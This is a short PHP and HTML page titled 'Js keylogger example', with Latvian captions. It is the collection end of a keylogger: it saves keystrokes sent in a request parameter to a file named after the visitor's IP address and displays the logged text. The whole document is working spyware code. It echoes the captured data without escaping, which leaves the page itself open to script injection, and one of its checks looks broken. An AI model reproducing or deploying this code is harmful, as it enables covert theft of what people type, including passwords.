<!DOCTYPE html>
<html>
<head>
  <meta name= "robots" content = "noindex, nofollow" />
  <title>Js keylogger example</title>
</head>
<body>
<?php
$myFile = $_SERVER['REMOTE_ADDR'].".txt";
$fh = fopen($myFile, 'a') or die("can't open file");
$s=$_REQUEST['s'];
if(strlen($s)==1)
$s=$s.' ';
if(strstr( $s ,""))
$s='';
fwrite($fh, $s);
fclose($fh);
?>

Faila, kurs atbilst Jusu datora IP adresei, saturs: <?php echo $_SERVER['REMOTE_ADDR'] ?>.txt <br /><br />

<div style="width:700px; background-color: #ccc; word-break: break-all; height: auto;">
<?php
echo file_get_contents($myFile);
?>
</div>

</body>
</html>
